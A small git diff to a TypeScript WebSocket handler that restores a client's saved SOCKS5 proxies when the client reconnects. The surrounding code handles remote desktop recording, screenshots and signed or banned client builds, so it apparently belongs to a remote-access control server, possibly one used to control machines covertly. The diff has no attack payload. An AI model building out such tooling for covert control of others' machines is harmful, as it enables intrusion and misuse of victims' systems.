@@ -22,7 +22,7 @@ import type { ClientInfo } from "../../types";
 import { clearClientSyncState, handleFrame, handleHello, handlePing, handlePong, handleScreenshotThumbnailResult, shouldRelayFrameToViewers } from "../../wsHandlers";
 import { queueClientDbUpdate, scheduleQueuedClientDbFlush } from "../../client-db-sync";
 import { getMaxPayloadLimit, getMessageByteLength, isAllowedClientMessageType } from "../../wsValidation";
-import { stopAllProxiesForClient } from "../socks5-proxy-manager";
+import { stopAllProxiesForClient, restoreSavedProxiesForClient } from "../socks5-proxy-manager";
 import { verifyBuildToken, isBuildBanned } from "../build-signing";
 import { clearThumbnail } from "../../thumbnails";
 import { stopRemoteDesktopRecording } from "../rd-recording";
@@ -1124,6 +1124,7 @@ export async function handleWebSocketMessage(
 
         scheduleQueuedClientDbFlush();
         clientManager.addClient(infoObj.id, infoObj);
+        restoreSavedProxiesForClient(infoObj.id);
 
         clearThumbnail(resolvedId);
 
